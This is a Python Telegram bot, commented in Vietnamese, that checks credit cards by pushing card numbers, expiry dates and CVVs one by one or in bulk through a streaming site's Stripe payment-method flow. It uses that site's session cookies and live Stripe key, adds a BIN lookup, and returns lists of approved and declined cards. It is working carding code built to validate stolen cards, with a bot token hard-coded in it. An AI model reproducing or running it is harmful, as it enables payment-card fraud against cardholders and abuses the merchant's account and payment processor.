import requests, re, time, asyncio
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from concurrent.futures import ThreadPoolExecutor

# ========== CẤU HÌNH ==========
TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
ADMIN_ID = 5127429005
ALLOWED_USERS = {ADMIN_ID}
USER_RANKS = {ADMIN_ID: "admin"}

COOKIES = "..."  # (Giữ nguyên phần COOKIES của bạn ở đây)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "cookie": COOKIES
}

# ========== LỆNH /chk ==========
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
        return

    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return

    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw)
    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return

    cc, mes, ano, cvv = match.groups()
    bin_code = cc[:6]
    await update.message.reply_text("🕐 Đang kiểm tra...")
    start_time = time.time()

    try:
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        token = soup.find("meta", {"name": "csrf-token"})["content"]

        r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
        json2 = r2.json()
        setid = json2["setup_intent"]
        setin = setid.split("_secret_")[0]

        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "VN",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/155bc2c263",
            "payment_method_data[referrer]": "https://urbanflixtv.com",
            "payment_method_data[guid]": "demo-guid",
            "payment_method_data[muid]": "demo-muid",
            "payment_method_data[sid]": "demo-sid",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }

        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
        j3 = r3.json()
        status = j3.get("status", "UNKNOWN")
        decline = j3.get("error", {}).get("decline_code", "NONE")

        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
            "User-Agent": "Mozilla/5.0", "Accept": "*/*", "Pragma": "no-cache"
        })
        bin_json = bin_res.json()
        card = bin_json.get("scheme", "N/A")
        type_ = bin_json.get("type", "N/A")
        brand = bin_json.get("brand", "N/A")
        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
        bank = bin_json.get("bank", {}).get("name", "N/A")

        elapsed = round(time.time() - start_time, 2)
        msg = f"""
<b>✅ CHECK RESULT</b>

<b>CC:</b> {cc}|{mes}|{ano}|{cvv}
<b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
<b>Decline Code:</b> {decline}

<b>Gateway:</b> Stripe
<b>Card:</b> {card.upper()}
<b>Type:</b> {type_.capitalize()}
<b>Brand:</b> {brand}
<b>Alpha2:</b> {alpha2}
<b>Bank:</b> {bank}

<b>Took:</b> {elapsed} sec
<b>Checked by:</b> mnhat [{user_id}]
"""
        await update.message.reply_html(msg)

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")

# ========== LỆNH /add ==========
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bạn không phải quản trị viên.")
        return

    if not context.args:
        await update.message.reply_text("Dùng: /add <user_id>")
        return

    try:
        new_id = int(context.args[0])
        ALLOWED_USERS.add(new_id)
        USER_RANKS[new_id] = "member"
        await update.message.reply_text(f"✅ Đã thêm user {new_id} với quyền member.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

# ========== LỆNH /info ==========
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    rank = USER_RANKS.get(user.id, "none")
    msg = f"""
👤 <b>Thông tin người dùng</b>

<b>Tên:</b> {user.full_name}
<b>ID:</b> {user.id}
<b>Rank:</b> {rank}
"""
    await update.message.reply_html(msg)

# ========== MULTI CHECK FUNCTION ==========
def sync_check_card(card_line):
    try:
        cc, mes, ano, cvv = card_line.strip().split('|')
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        token = soup.find("meta", {"name": "csrf-token"})["content"]
        r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
        json2 = r2.json()
        setid = json2["setup_intent"]
        setin = setid.split("_secret_")[0]
        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[billing_details][address][country]": "VN",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }
        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
        j3 = r3.json()
        status = j3.get("status", "UNKNOWN")
        return card_line if status == "succeeded" else f"DECLINE: {card_line}"
    except Exception as e:
        return f"ERROR: {card_line} -> {str(e)}"

# ========== LỆNH /multi ==========
async def multi_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền dùng lệnh này.")
        return

    await update.message.reply_text("📤 Đang xử lý file...")

    file_path = "/mnt/data/cards.txt"
    approved, declined = [], []

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            card_lines = [line.strip() for line in f if line.strip()]

        loop = asyncio.get_running_loop()
        with ThreadPoolExecutor(max_workers=5) as executor:
            results = await asyncio.gather(*[
                loop.run_in_executor(executor, sync_check_card, line)
                for line in card_lines
            ])

        for result in results:
            if result.startswith("DECLINE"):
                declined.append(result.replace("DECLINE: ", ""))
            elif result.startswith("ERROR"):
                declined.append(result)
            else:
                approved.append(result)

        with open("fileApproved.txt", "w", encoding="utf-8") as fa:
            fa.write("\n".join(approved))
        with open("fileDecline.txt", "w", encoding="utf-8") as fd:
            fd.write("\n".join(declined))

        await update.message.reply_text(
            f"✅ Đã kiểm tra xong {len(card_lines)} dòng.\n"
            f"✔ Approved: {len(approved)}\n❌ Declined: {len(declined)}"
        )
        await context.bot.send_document(chat_id=update.effective_chat.id, document=open("fileApproved.txt", "rb"))
        await context.bot.send_document(chat_id=update.effective_chat.id, document=open("fileDecline.txt", "rb"))

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

# ========== KHỞI CHẠY ==========
if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("multi", multi_check_handler))
    print("✅ Bot đang chạy...")
    app.run_polling()
